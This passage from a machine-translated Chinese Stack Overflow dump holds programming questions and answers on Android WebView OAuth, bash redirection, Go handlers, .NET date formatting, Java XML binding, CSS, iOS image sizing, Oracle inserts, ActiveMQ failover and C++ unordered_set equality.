        transport.webView = mWebviewPop
        resultMsg.sendToTarget()
        return true
    }

    override fun onCloseWindow(window: WebView) {
        Log.d("onCloseWindow", "called")
    }
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2017-10-11T06:46:46.243

可能不是一个总是可行的答案，但另一种选择是从“弹出然后 JS”样式 OAuth 登录切换到非弹出“redirect_uri”OAUth 样式，将它们发送到登录页面，然后在成功/失败后它们被发送到完成身份验证的“某些 uri err other”（例如：您自己网站上的另一个页面）。FWIW。

FWIW facebook 说“如果你正在做 WebView 将它们重定向到 [https://www.facebook.com/connect/login_success.html](https://www.facebook.com/connect/login_success.html) ”我的直觉是（只有一个 WebView 和）使用 OAuth 的情况登录，所以他们会向 login_success.html 添加一些身份验证参数，然后您可以收集这些参数，而不是正常的网络流程......

另一种可能性可能是[覆盖](https://stackoverflow.com/a/10037870/32453)javascript`postMessage`函数，以便您可以捕获它将*要*返回到父窗口的内容。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2016-02-22T14:03:28.477

尝试将您的 webview 移动到 xml 布局文件。空白页错误是由于将 oAuth 登录重定向到授权接受页面时 js 脚本失败导致的。您可以通过将 webview 移动到 xml 布局来解决此问题。

# java - 带有换行符的 Bash 输入重定向

> ID：12648101
> 
> 赞同：1
> 
> 时间：2012-09-28T22:20:20.653
> 
> 标签：java, bash, unit-testing, input, io-redirection

因此，对于学校的作业，我需要用 Java 编写一个程序来管理大学里的一些学生，用户可能会调用一些函数，但我从测试“添加”开始。

我的教授建议我使用输入重定向，因为我可以轻松地反复测试程序，而无需输入太多内容。现在问题来了。

```
echo `< input.txt`
add Student Name 123 Street,City,Province,Postal Code q
#Input rediraction ate my newlines
cat input.txt
add
Student Name
Street,City,Province,Postal Code
q
#What I actually want to run
java -cp . TestCollege < input.txt #fail horribly 
```

如您所见，bash 删除了我用来分隔输入的换行符，因此我的程序崩溃了，因为当您在交互模式下运行它时，Scanner.getLine() 只会阻塞，直到输入发生。

知道如何用换行符给我的程序输入，它似乎在 Windows“cmd”中运行良好，但在“bash”中运行良好。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T22:24:59.127

你可以尝试环绕`BufferedInputStream`，`System.in`因为它可以处理这两种情况： `\r\n`和`\n`; 我认为这就是你的问题所在。

或者更确切地说，调用`useDelimiter(System.getProperty("line.separator"))`.`Scanner`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T23:05:21.640

好吧，你可以看到 bash 如何不吃掉正在运行的换行符

```
$ wc -l < input.txt 
```

我想这会给你你所期望的价值。

# go - golang 导入结构指针

> ID：12648104
> 
> 赞同：3
> 
> 时间：2012-09-28T22:20:40.203
> 
> 标签：go

好的，我有一个主包和一个 http 处理程序包。本质上，我要做的是设置一个全局结构，这样我就可以随时调用该结构中的信息。

下面是我尝试的示例的基本概述： 主包导入处理函数 主包调用 handlerfunc Handlerfunc 将 http.ResponseWriter 和其他项目设置为 UrlInfo struct Handlerfunc 运行传入函数（无需将 UrlStruct 传递给函数） 运行函数（本例中为 home）函数 home 可以随时调用变量 uinfo 导致其指针 UrlInfo 结构

显然这不起作用，但这本质上是我想做的，这样我就不必将所有这些信息传递到我的家庭功能中。保持干净和简单。

欢迎任何想法和想法。谢谢。

处理程序包

```
package handler

// Struct containing http requests and variables
type UrlInfo struct {
    Res http.ResponseWriter
    Req *http.Request
    Item string
}

func HandleFunc(handlepath string, runfunc func()) {
    // Set handler and setup struct
    http.HandleFunc(handlepath, func(w http.ResponseWriter, r *http.Request) {
        url := new(UrlInfo)
        url.Res = w
        url.Req = r
        url.Item = "Item information"

        runfunc()
    })
} 
```

主包

```
import "handler"

var uinfo = &handler.UrlInfo{}

func init() {
    handler.HandleFunc("/home/", home)
}

func home() {
    fmt.Println(uinfo.Item)
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-29T00:28:43.790

根据我从您的问题中收集到的信息，您正在尝试定义一个结构的单个全局实例，其中包含对当前 Request 和 ResponseWriter 的引用。

如果这是意图，我应该警告你这会导致问题。Go 的 http 包在单独的 goroutine 中执行每个请求处理程序。这意味着您可以同时处理任意多个请求。因此，它们不能都安全地引用同一个全局结构并期望它包含仅与该特定请求相关的请求信息。如果您希望您的服务器是线程安全的，则不应使用全局实例。

通过在结构中分组无关参数来保持代码清洁可能很方便，但在您的情况下，我不相信您可以（或应该）避免将`UrlInfo`结构的新实例直接`home()`作为参数传递。它会使事情变得不必要的复杂和不可预测。

# .net - 构建可在 .NET 中本地化的自定义日期/时间字符串格式的正确方法是什么？

> ID：12648119
> 
> 赞同：0
> 
> 时间：2012-09-28T22:22:13.627
> 
> 标签：.net, localization

我需要一个日期字符串，其中一位数字表示月份，一位数字表示日期，两位数字表示年份（`M/d/yy`在美国，`d/M/yy`在大多数其他地方）。我还需要它跨区域工作，因此它应该自动处理月/日的顺序和分隔符。最接近这一点的是通过调用时`d`返回的格式。`MM/dd/yyyy``date.ToString("d")`

这需要跨区域工作，所以我尝试了这是我想出的：

```
string format = culture.DateTimeFormat.ShortDatePattern
                                   .Replace("yyyy", "yy")
                                   .Replace("dd", "d")
                                   .Replace("MM", "M");

return date.ToString(format); 
```

使用`culture.DateTimeFormat.ShortDatePattern`给了我用于日期格式的`d`日期格式。使用此属性将处理日/月/年的顺序和日期分隔符。

有一个更好的方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T22:24:08.857

如果您确实想要*确切*的格式`M/d/yy`，那么只需使用它：

```
return date.ToString("M/d/yy", culture); 
```

但是，这不一定是*适合*文化的字符串。例如，它对英国的任何人来说都是陌生的，他们会期望更多的`d/M/yy`格式 - 前一个月。

请注意，`MM/dd/yyyy`格式可能是您使用时获得的格式`date.ToString("d")`，但绝对不是您在英国获得的格式。

基本上，您需要决定是否要确定格式，在这种情况下您正在吹本地化 - 或者您是否要使用“正常”文化特定的短日期字符串格式，在这种情况下`date.ToString("d", culture)`是有意义的。

听起来您可能正在尝试中途 - “短日期格式，但绝对不要使用 4 位数年份”等。虽然这*可能*有效（确保您也传递`culture`到该`ToString`方法）但不能保证文化的短日期模式将使用`dd`etc 开始。它可能会出现严重错误，例如，如果正常的短日期格式是`ddd dd MMM yyyy`你最终会得到的`dd d MM yy`，那么就像 2012 年 6 月 9 日的“09 9 06 12”。

基本上，除非您*实际上*已经将文化映射到“甚至更短的日期格式”，否则我不建议像这样捏造它。

编辑：这是一个简短的程序，您应该检查其输出。基本上它会打印原始格式和修改后的格式。

```
using System;
using System.Globalization;

class Program
{
    public static void Main()
    {
        foreach (var culture in 
                        CultureInfo.GetCultures(CultureTypes.SpecificCultures))
        {
            string original = culture.DateTimeFormat.ShortDatePattern;
            string modified = original.Replace("yyyy", "yy")
                                      .Replace("dd", "d")
                                      .Replace("MM", "M");
            Console.WriteLine("{0,11}: {1,12} => {2,-9}",
                              culture, original, modified);
        }
    }
} 
```

在我的机器上，快速浏览列表，我认为你实际上会没事的。似乎没有使用`ddd`或使用`MMM`原始格式。但不能保证这种情况会继续下去......

# c# - 是否有使用 razor 和 EF 实现就地网格编辑器的干净模式？

> ID：12648122
> 
> 赞同：1
> 
> 时间：2012-09-28T22:22:40.317
> 
> 标签：c#, asp.net-mvc-3, entity-framework, razor, webgrid

我希望实现一个就地网格编辑器，但数据模式不适合预期的视图。该模型看起来像两个实体 - 一个包含商店位置（第一列），但重复数据是基于其余列的日期。每天都会创建新的数据元素。我希望能够单击一个单元格，并自动进入编辑模式，使其看起来像电子表格示例。我想知道这是否可以在网格中完成，或者我应该创建一个使用转发器按日期加载的用户控件？任何帮助表示赞赏！（我不能发布图片，所以我会在这里尽力而为！）

> （模拟电子表格！）

```
 Oct 1           Oct 2         Oct 3.....         
          Screws   Nuts   Screws  Nuts
Store1      35      35      22     25
 Shelf1     10      10       9      9
 Shelf2     16      16      11     11
 Shelf3      9       9      12     16
Store2
 Shelf1
 Shelf2 
```

新数据行显示为具有新日期的列

# php - 未授予 Ftp 文件夹权限

> ID：12648123
> 
> 赞同：0
> 
> 时间：2012-09-28T22:22:41.183
> 
> 标签：php, file, ftp, directory

我有存储我的网站上传文件的 ftp 服务器。我将上传的图像放入“上传”目录，然后将它们显示到带有我的照片编辑器工具链接的网页。

有些我无法在我的照片编辑器中访问我的 ftp 文件。我认为这是权限问题，但是当我更改上传目录文件的权限时，它无法更改并说

“CHMOD 777 realtors.jpg：不允许操作。”

让我知道如何解决这个问题。

# java - 将java中对象的数据写入xml文件

> ID：12648125
> 
> 赞同：0
> 
> 时间：2012-09-28T22:22:41.873
> 
> 标签：java, xml

我有一段代码如下：

```
 Person person1 = new Person();
    person1.setName("abc");
    person1.setAge(23);

    Person person2 = new Person();
    person2.setName("xyz");
    person2.setAge(32); 
```

它需要在 xml 文件中重新表示为：

```
 <Person>
       <person1>
           <name>abc</name>
           <age>23</age>
       </person1>
       <person2>
           <name>abc</name>
           <age>23</age>
       </person2>
   </Person> 
```

我该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T22:36:03.710

我猜你正在寻找 java-xml 绑定。您可以 JAXB 绑定和编组。请查看链接 [http://www.mkyong.com/java/jaxb-hello-world-example/](http://www.mkyong.com/java/jaxb-hello-world-example/)以获取示例。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-28T23:49:11.710

查看链接中的代码，我为我的代码实现了它。代码如下。我只能为一个对象编写 xml 数据，如果我循环它只会写入最后一个对象。因此，当我尝试在附加模式下使用该文件时，它停止运行：

```
try {
    FileOutputStream file = new FileOutputStream("file.xml", true);
    JAXBContext jaxbContext = JAXBContext.newInstance(NeuronNode.class);
    Marshaller jaxbMarshaller = jaxbContext.createMarshaller();

    // output pretty printed
    jaxbMarshaller.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, true);

    for(int i=0; i<neuronNodes.length; i++)
    {
        jaxbMarshaller.marshal(neuronNodes[i], file);
        jaxbMarshaller.marshal(neuronNodes[i], System.out);
    }

} catch (JAXBException e | IOException e) {
    e.printStackTrace();
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-28T22:33:51.290

您还可以使用序列化和 XML-Parser（例如 DOM）。如果创建 XML 文档，则可以使用 XPath 进行查询。

我也会考虑使用[http://simple.sourceforge.net/](http://simple.sourceforge.net/ "简单的")

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-28T22:31:15.877

我已经多次使用[XStream](http://xstream.codehaus.org/)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-01-02T03:07:22.390

**使用Jackson Library 和 XMLMapper 方法**解决了这个问题。这是相同的代码。

```
 **MainClass.java:-**

  import java.io.IOException;

  import com.fasterxml.jackson.databind.ObjectMapper;
  import com.fasterxml.jackson.databind.SerializationFeature;
  import com.fasterxml.jackson.dataformat.xml.XmlMapper;

   public class MainClass {

   public static void main(String[] args) throws IOException {

    String xmlString = "   <Person>\r\n" + "       <person1>\r\n" + "           
        <name>abc</name>\r\n"
            + "           <age>23</age>\r\n" + "       </person1>\r\n" + "       
        <person2>\r\n"
            + "           <name>abc</name>\r\n" + "           <age>23</age>\r\n" + "       
       </person2>\r\n"
            + "   </Person>";

    ObjectMapper xmlMapper = new XmlMapper();
    xmlMapper.enable(SerializationFeature.INDENT_OUTPUT);

    Person1 person1 = new Person1();
    person1.setName("abc");
    person1.setAge("23");

    Person2 person2 = new Person2();
    person2.setName("xyz");
    person2.setAge("32");

    Person person = new Person();
    person.setPerson1(person1);
    person.setPerson2(person2);

    String XMLStr = xmlMapper.writeValueAsString(person);

    System.out.println(XMLStr);

} }

    **Person.java:-**

   public class Person {
    Person1 Person1Object;
    Person2 Person2Object;

// Getter Methods

public Person1 getPerson1() {
    return Person1Object;
}

public Person2 getPerson2() {
    return Person2Object;
}

// Setter Methods

public void setPerson1(Person1 person1Object) {
    this.Person1Object = person1Object;
}

public void setPerson2(Person2 person2Object) {
    this.Person2Object = person2Object;
   } }

 **Person1.java:-**
public class Person1 {
private String name;
private String age;

// Getter Methods

public String getName() {
    return name;
}

public String getAge() {
    return age;
}

// Setter Methods

public void setName(String name) {
    this.name = name;
}

public void setAge(String age) {
    this.age = age;
} }

  **Person2.java:-**

  public class Person2 {
private String name;
private String age;

// Getter Methods

public String getName() {
    return name;
}

public String getAge() {
    return age;
}

// Setter Methods

public void setName(String name) {
    this.name = name;
}

public void setAge(String age) {
    this.age = age;
} }

  **OUTPUT:-**

       <Person>
         <person1>
              <name>abc</name>
              <age>23</age>
        </person1>
         <person2>
              <name>xyz</name>
              <age>32</age>
        </person2>
      </Person> 
```

# css - WebKit 错误？悬停状态不会应用于通过 CSS 插入的内容

> ID：12648127
> 
> 赞同：3
> 
> 时间：2012-09-28T22:22:46.277
> 
> 标签：css, webkit

似乎存在一个 WebKit 错误，它不会将悬停状态应用于通过`content`CSS 中的属性插入的内容。

有谁知道这个的解决方法？

```
a:before {
    content: "Hover Over Me";
}
a:hover {
    color: red;
} 
```

示例：http: [//jsfiddle.net/wdmedal/X4gjL/1/](http://jsfiddle.net/wdmedal/X4gjL/1/)

* * *

**结论**：这个错误似乎只影响`inline`元素。

**解决方法**：将元素的显示类型设置为`inline-block`（或其他显示类型）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T22:52:03.803

这对我[有用 http://jsfiddle.net/X4gjL/5/](http://jsfiddle.net/X4gjL/5/)

```
a:before {
    content: "Hover Over Me";
}
a.foo:hover {
    color: red;
}
a.foo
{
    display:block;
}​ 
```

- - - - - - -编辑 - - - - -

感谢[BoltClock](https://stackoverflow.com/users/106224/boltclock)指出这一点，使其 inline-block 默认情况下不会像块一样使宽度为 100%。 [http://jsfiddle.net/X4gjL/6/](http://jsfiddle.net/X4gjL/6/)

```
a:before {
    content: "Hover Over Me";
}
a.foo:hover {
    color: red;
}
a.foo
{
    display:inline-block;
}​ 
```

# uiimageview - UIImageview programmilly 管理 iphone5 和 iphone4

> ID：12648129
> 
> 赞同：3
> 
> 时间：2012-09-28T22:22:56.537
> 
> 标签：uiimageview, ios6, iphone-4

![在此处输入图像描述](../Images/adb4b1a7565956acc9fe22fc964d9292.png)我有一个关于通过 XIB 文件管理 iphone5 屏幕高度和 Iphone4 屏幕高度的 UIImageView 的问题。

我尝试像这样管理 UIImageView 的代码

~

```
 CGFloat screenHeight = [UIScreen mainScreen].bounds.size.height;
    if ([UIScreen mainScreen].scale == 2.f && screenHeight == 568.0f) {
        backgroundImage.autoresizingMask=UIViewAutoresizingFlexibleHeight|UIViewAutoresizingFlexibleWidth;
        frameView.autoresizingMask=UIViewAutoresizingFlexibleHeight;

        backgroundImage.image = [UIImage imageNamed:@"bg-568h@2x.png"];
        //frameView.frame=CGRectMake(16, 0, 288, 527);

        frameView.image = [UIImage imageNamed:@"setframe-568h@2x.png"];
    }
    else
    {
        backgroundImage.image = [UIImage imageNamed:@"bg@2x.png"];
        frameView.image = [UIImage imageNamed:@"setframe@2x.png"];
    }  ; 
```

请就问题向我提出建议，FrameView 是具有白色图像的 UIImageView，

请谢谢

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-10-08T02:11:33.690

我遇到了同样的问题，下面是我为使它对我有用所做的工作。

我有几个应用程序中使用的图像，需要为新的 4 英寸显示屏调整大小。我编写了下面的代码来根据需要自动调整图像大小，而无需指定视图的高度。此代码假定给定图像的高度在 NIB 中调整为给定帧的全高，就像它是填充整个视图的背景图像一样。在 NIB 中，UIImageView 不应设置为拉伸，这将为您完成拉伸图像的工作并扭曲图像，因为只有高度发生变化而宽度保持不变。您需要做的是将高度和宽度调整相同的增量，然后将图像向左移动相同的增量以再次居中。这会在两侧切掉一点，同时使其扩展到给定框架的整个高度。

我这样称呼它...

```
[self resizeImageView:self.backgroundImageView intoFrame:self.view.frame]; 
```

如果图像是在 NIB 中设置的，我通常会在 viewDidLoad 中执行此操作。但我也有在运行时下载并以这种方式显示的图像。这些图像是用 EGOCache 缓存的，所以我必须在将缓存的图像设置到 UIImageView 之后或在图像下载并设置到 UIImageView 之后调用 resize 方法。

下面的代码并不特别关心显示器的高度是多少。它实际上可以与任何显示尺寸一起使用，也许也可以处理调整图像大小以进行旋转，认为它假设每次高度变化都大于原始高度。为了支持更大的宽度，还需要调整此代码以响应该场景。

```
- (void)resizeImageView:(UIImageView *)imageView intoFrame:(CGRect)frame {
    // resizing is not needed if the height is already the same
    if (frame.size.height == imageView.frame.size.height) {
        return;
    }

    CGFloat delta = frame.size.height / imageView.frame.size.height;
    CGFloat newWidth = imageView.frame.size.width * delta;
    CGFloat newHeight = imageView.frame.size.height * delta;
    CGSize newSize = CGSizeMake(newWidth, newHeight);
    CGFloat newX = (imageView.frame.size.width - newWidth) / 2; // recenter image with broader width
    CGRect imageViewFrame = imageView.frame;
    imageViewFrame.size.width = newWidth;
    imageViewFrame.size.height = newHeight;
    imageViewFrame.origin.x = newX;
    imageView.frame = imageViewFrame;

    // now resize the image
    assert(imageView.image != nil);
    imageView.image = [self imageWithImage:imageView.image scaledToSize:newSize];
}

- (UIImage *)imageWithImage:(UIImage *)image scaledToSize:(CGSize)newSize {
    UIGraphicsBeginImageContextWithOptions(newSize, NO, 0.0);
    [image drawInRect:CGRectMake(0, 0, newSize.width, newSize.height)];
    UIImage *newImage = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return newImage;
} 
```

# c# - 尝试在 foreach 中创建时未形成字符串

> ID：12648131
> 
> 赞同：1
> 
> 时间：2012-09-28T22:23:00.853
> 
> 标签：c#, string, oracle, arraylist, parameter-passing

我有一个班级 People_val。我在另一个班级列出了这个班级。现在我在这个列表上做一个 foreach 并且对于每个项目我调用它的 ToSQL() 函数，它给了我一个插入查询。列表计数超过 50,000 条记录。第 9774 个查询未完全形成。 **9771 INSERT INTO CONVERSION_PEOPLE_VALIDATION VALUES（16413，'Jnto'，'Johnson'，**因此命令未执行并且事务回滚。我应该怎么做才能在 foreach 中获取完整的字符串。

```
public class People_Val
{
    public int MEMBERS_ID;
    public string PFirstName;
    public string PLastName;

    public DateTime? BIRTH_DATE;
    public string RELATIONSHP;

    public string ToSQL()
    {            
        return string.Format("INSERT INTO CONVERSION_PEOPLE_VALIDATION VALUES ({0},'{1}','{2}','{3}', TO_CHAR('{4}', 'DD-MON-YYYY'))",
                             MEMBERS_ID, PFirstName.Replace("'","\""), PLastName.Replace("'","\""), RELATIONSHP, BIRTH_DATE);
    }
}

public void insertPeopleValTrans(List<People_Val> _lstPeoplevals)
{
    int count=0;
    TextWriter tw = new StreamWriter(@"C:\PeopleVal.txt");
    using (OracleConnection conn = new OracleConnection(connectionStr)) {
        conn.Open();
        OracleTransaction trans;
        trans = conn.BeginTransaction();
        try {
            foreach (People_Val peopleVal in _lstPeoplevals) {
                OracleCommand cmd = new OracleCommand(peopleVal.ToSQL(), conn, trans);
                cmd.ExecuteNonQuery();
                count++;
                if (count % 500 == 0) {
                    Console.WriteLine("saving " + count.ToString() + " Records");
                }
                tw.WriteLine(count.ToString()+" "+ peopleVal.ToSQL());
            }
            trans.Commit();
            tw.Close();
        } catch (Exception ex) {
            Console.WriteLine(ex.Message);
            trans.Rollback();
        }
        conn.Close();
    }          
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T22:56:53.410

您可能在某些数据中有一个撇号，这会导致您的查询失败。

尝试参数化您的输入...看起来 RELATIONSHIP 字段是原始数据，这可能是问题所在。看看[http://www.devart.com/dotconnect/oracle/articles/parameters.html](http://www.devart.com/dotconnect/oracle/articles/parameters.html)我很确定这会解决你的问题。

粘贴到第 9771 行让我们看看...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T22:39:34.560

真的有必要将所有 50000 条记录一起成功或失败吗？否则跳过事务或至少更频繁地提交，也许像......

```
if (count % 500 == 0)
{
    trans.Commit();
    Console.WriteLine("saving " + count.ToString() + " Records");
    trans = conn.BeginTransaction();
} 
```

我同意前面的评论，这将是使用实体框架代码优先的最小努力。

# jquery - JQuery 自动完成 - 选择项目并更改其颜色

> ID：12648142
> 
> 赞同：2
> 
> 时间：2012-09-28T22:24:27.320
> 
> 标签：jquery, jquery-ui, autocomplete

我正在使用自动完成触发器[http://jsfiddle.net/dmattes/2YRgW/1/](http://jsfiddle.net/dmattes/2YRgW/1/)

选择标签后是否可以着色？

自动完成中的文本示例： **我和安娜去了@barcelona** *巴塞罗那应该是彩色的*

亲切的问候，迪玛

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-19T17:30:10.667

你可以在 jsfiddle 上看到我认为这就是你要找的。

[http://jsfiddle.net/2YRgW/191/](http://jsfiddle.net/2YRgW/191/)

JS

```
$('input,textarea').autocompleteTrigger({
    triggerStart : '@',
    triggerEnd: '',
    source: [
        "Asp",
        "BASIC",
        "COBOL",
        "ColdFusion",
        "Erlang",
        "Fortran",
        "Groovy",
        "Java",
        "JavaScript",
        "Lisp",
        "Perl",
        "PHP",
        "Python",
        "Ruby",
        "Scala",
        "Scheme"
    ]
});
$('input,textarea').autocomplete({
    select: function(event, ui){
       $('.text2').html(ui.item.value);
       $('.text2').css("background-color","green");
    }
});
​ 
```

HTML

```
<h2>Textfield</h2>
<input type='text' />

<div>&nbsp;</div>

<h2>Textarea</h2>
<textarea class="text2" col="50" row="3"></textarea> 
```

编辑：

我看到您要求更改文本颜色，而不是框的颜色。我换了提琴手。

[http://jsfiddle.net/2YRgW/192/](http://jsfiddle.net/2YRgW/192/)

# java - 用于执行 Java Web 服务的测试工具

> ID：12648143
> 
> 赞同：0
> 
> 时间：2012-09-28T22:24:32.317
> 
> 标签：java, web-services

有人可以建议用于执行 Java Web 服务以进行测试的测试工具吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T22:30:42.697

您可以使用 SOAP UI 工具。谢谢罗摩克里希纳。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T05:26:19.107

虽然soapUI 很好，但它只能让您的Web 服务端点作为一个整体进行测试。从持续集成的角度来看，这很好。

问题是您不能使用soap ui 进行单元测试，因为您不能真正模拟出Web 服务的依赖关系。

正是出于这个原因，我们决定使用 Apache CXF 作为我们选择的 Web 服务框架。Apache CXF 与 Spring 紧密耦合，因此允许您将依赖注入等特性利用到 Web 服务类中。如果您的目标是易于开发和单元测试，您应该看看 Apache CXF。

# apache - 删除mac上的虚拟主机

> ID：12648146
> 
> 赞同：0
> 
> 时间：2012-09-28T22:24:35.413
> 
> 标签：apache, mamp, host

我在我的 Mac 上使用 MAMP PRO（运行 OSX 10.8 Mountain Lion）。
今天我添加了一个新主机并设法将其命名为 sitename **.org**，这使我现在无法在线访问它。

拳头我试图重命名主机 - 没有奏效。
然后我试图删除主机 - 没有工作。试图重命名文件夹（也被命名为*sitename.org*） - 没有用。

所以基本上现在我根本无法访问这个特定的站点。我已经设置了正确的磁盘位置和所有内容，但它只使用“Document-Root：/Applications/MAMP/htdocs”。即使是现在，在我删除主机后，它仍然显示“”erver name：sitename.org“。

还重装了机器...

有谁知道我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-01T07:00:22.427

我相信 MAMP Pro 会在启动时设置所有 apache 设置，将它们保存在其首选项 plist 或类似列表中，因此：

*   启动 MAMP 专业版
*   单击站点选项卡
*   点击下面的+按钮
*   填写您网站的详细信息（所需的本地 URL，例如站点名称或站点名称.dev）
*   重新启动 MAMP

这里有 Mamp Pro 的视频：[http ://www.youtube.com/watch?v=4hMW8sTFftI](http://www.youtube.com/watch?v=4hMW8sTFftI)

如果您在尝试手动设置时遇到任何麻烦，请检查您的`/etc/hosts`文件，删除与您的“sitename.org”相关的所有行。这样，您的机器将在线查找 sitename.org，而不是认为该站点应该在本地提供。

您可能需要刷新您的 dns 缓存？对于 10.8 尝试：

```
sudo killall -HUP mDNSResponder 
```

# testing - 敏捷测试与传统测试方法

> ID：12648152
> 
> 赞同：0
> 
> 时间：2012-09-28T22:25:03.753
> 
> 标签：testing, agile

敏捷测试与传统的结构化测试有何不同？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-28T22:28:07.900

没有“敏捷测试”之类的东西，但通常作为敏捷方法的关键组成部分呈现的东西是[单元测试](http://en.wikipedia.org/wiki/Unit_testing)，它早于敏捷。这与“传统的结构化测试”有何不同取决于您的意思。

在敏捷和单元测试的上下文中经常出现的其他可能会引起您困惑的事情：[测试驱动开发](http://en.wikipedia.org/wiki/Test_Driven_Development)和[持续集成](http://en.wikipedia.org/wiki/Continuous_integration)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T22:35:56.373

敏捷项目通常会更加强调*自动化*测试、集成和验收测试以及单元测试，因为手动测试很快就会变得太慢而无法频繁发布。

TDD 方法将重点从“测试以发现缺陷”转变为“测试作为一种设计技术”。

思维方式可能非常不同——敏捷项目使用测试来实现快速重构和更改——你可以毫无畏惧地进行重大更改，因为测试会告诉你什么是有效的。传统项目害怕改变；他们的测试可能不会以相同的方式构建，并且可能会抑制变化。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-29T21:41:15.623

当然，这取决于您如何定义“传统结构化测试”和“敏捷测试”......

这是我在对我见过的最有效的敏捷团队进行测试时倾向于观察到的。

*   没有单独的测试组。测试人员在开发团队中工作——而不是与它分开。
*   测试是在整个开发过程中发生的持续过程，而不是在开发后的单独阶段发生的事情。
*   测试由整个团队完成，而不仅仅是测试人员。最明显的例子是 TDD 产生的测试——但它也发生在其他地方（例如，产品所有者经常参与帮助定义围绕正在完成的故事的更高级别的验收测试）。
*   测试人员充当整个团队/为整个团队进行测试的教育者和促进者——而不是控制所有测试的瓶颈。
*   测试人员和非测试人员之间的关系往往更具协作性/协作性，而不是对抗性。
*   一般来说，我发现测试人员在敏捷团队中得到更多尊重。
*   测试人员更早地参与到流程中，从而更容易确保生成易于测试的系统。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-01T01:17:24.743

我认为包括测试软件的实际部分可能非常相似。

最大的不同是你到达那里的方式。通常，在敏捷环境中，您从事的小部分开发工作会很快进入生产相关性。这可能是一个月到两周的时间。

这些较小的故事和更快的截止日期需要由整个团队决定的更轻量级的要求和更小的开发部分。测试人员没有时间花时间编写测试策略文档。较小的迭代允许测试人员只专注于测试。

鼓励每个人都在同一页面上通常会减少返工量。随着每个人都在处理较小的部分，通常会更频繁地构建和部署软件。这导致了对构建良好的 CI 环境的高度重视。CI 是 600 页的主题，所以我会把它留给你进一步研究。

对我来说，最大的不同是球队的心态。每个人都在共同努力发布软件。敏捷在消除开发人员与测试人员的僵局方面做得很好。与其争论谁有过错（糟糕的测试、糟糕的代码、糟糕的需求等），不如让团队一起解决问题。公司必须通过消除缺陷计数或其他妨碍团队合作的统计数据来鼓励这种情况自然发生。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-28T09:28:14.537

无论您采用何种方法，产品质量的基础都是相同的。从瀑布式到敏捷的变化在于，测试在冲刺的早期就开始了，以及测试的执行方式。随着 TDD 等实践的发展，测试的重点也得到了改善。

从单元测试到系统测试和验收测试，所有这些测试都以新的方式进行。例如：现在在开发过程中，Tester 可以参与诸如“show me sessions”之类的会议，他可以提供早期反馈。

冲刺工作促使我们在每个周期中进行回归测试，并在演示之前进行验收测试。所以事情是如何从敏捷变成瀑布的（结构化测试）

# activemq - ActiveMQ 和随机化

> ID：12648153
> 
> 赞同：1
> 
> 时间：2012-09-28T22:25:12.730
> 
> 标签：activemq, broker

假设我有以下 ActiveMQ 连接字符串：

故障转移:(tcp://broker1:61616,tcp://broker2:61616)?randomize=true

我正在从具有此配置的 Java 生产者向代理发送数千个请求。

有时我注意到所有消息最终只发送到一个代理，而另一个没有收到一条消息。

这是正常行为吗？

在 10 次测试中，我可能已经注意到这种行为几次。在其他时候，两个经纪人都收到了消息。

randomize=true 是如何工作的？

我在[http://activemq.apache.org/failover-transport-reference.html](http://activemq.apache.org/failover-transport-reference.html)上找到的唯一解释是：“使用随机算法从提供的列表中选择用于重新连接的 URI”

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T22:41:17.910

故障转移传输上的 randomize 标志表示传输应该随机选择一个配置的代理 URI 来连接（在您的情况下，有两个可供选择。一旦客户端连接到这些代理之一，客户端将保持愉快已连接并仅向该代理发送消息，直到发生某些事情中断连接。一旦连接中断，客户端将再次尝试连接到这两个代理之一。因此，在您的情况下，单个生产者将其所有消息发送到一位经纪人的意思是，它的工作方式也像预期的那样。

# c++ - 为什么这些 C++ STL 无序集不被视为相等？

> ID：12648154
> 
> 赞同：5
> 
> 时间：2012-09-28T22:25:14.113
> 
> 标签：c++, visual-studio-2010, visual-c++, std, unordered

我希望下面的两个无序集被评估为等价的，但令我惊讶的是，它们不是。发生这种情况是因为这两个字符串存储在同一个哈希桶中，并且 operator== 对集合中的项目进行顺序比较。这是否应该被视为 std::unordered_set 中的错误？有没有人有一个优雅的解决方法？

```
std::unordered_set<std::string> a,b;
a.insert("500666");
a.insert("961021");
b.insert("961021");
b.insert("500666");

if (a == b)   // condition is evaulated as false
{   
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-28T22:43:04.820

这是 Visual C++ 2010 标准库实现中的一个已知错误。此错误已在 Visual C++ 2012 中修复；如果此错误影响您，则可能值得考虑升级。（[在 Microsoft Connect 上有一个错误](https://connect.microsoft.com/VisualStudio/feedback/details/557117/std-unordered-set-equality-comparison-broken-in-visual-c-2010)，但它似乎已经消失了；我正试图弄清楚它发生了什么。）

作为一种解决方法，请考虑您是否真的需要使用无序关联容器——它们的性能不一定比有序关联容器的性能好。

# ruby - instance_eval 的块参数 - 记录了吗？目的？

> ID：12648157
> 
> 赞同：7
